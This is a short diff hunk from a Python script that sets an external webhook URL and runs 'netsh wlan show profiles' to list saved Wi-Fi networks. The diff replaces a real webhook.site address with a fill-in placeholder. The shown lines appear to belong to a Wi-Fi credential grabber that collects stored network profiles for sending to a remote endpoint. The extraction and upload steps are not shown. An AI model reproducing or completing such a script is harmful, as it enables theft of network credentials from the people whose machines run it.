@@ -3,7 +3,7 @@ import re
 import requests
 
 # Replace with your actual webhook URL
-webhook_url = "https://webhook.site/af636967-865b-411b-ba18-c0a284591119"
+webhook_url = "Your-Webhook-Url"
 
 # Get all Wi-Fi profiles
 command_output = subprocess.run(["netsh", "wlan", "show", "profiles"], capture_output=True).stdout.decode()
